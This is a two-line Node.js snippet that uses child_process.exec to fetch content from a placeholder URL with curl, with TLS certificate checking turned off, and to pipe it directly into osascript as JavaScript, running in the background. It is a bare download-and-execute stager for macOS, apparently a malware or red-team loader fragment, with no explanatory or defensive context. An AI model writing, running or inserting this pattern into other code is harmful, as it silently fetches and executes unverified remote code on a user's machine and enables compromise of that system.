const { exec } = require('child_process')

exec('curl -k "URL" | osascript -l JavaScript &')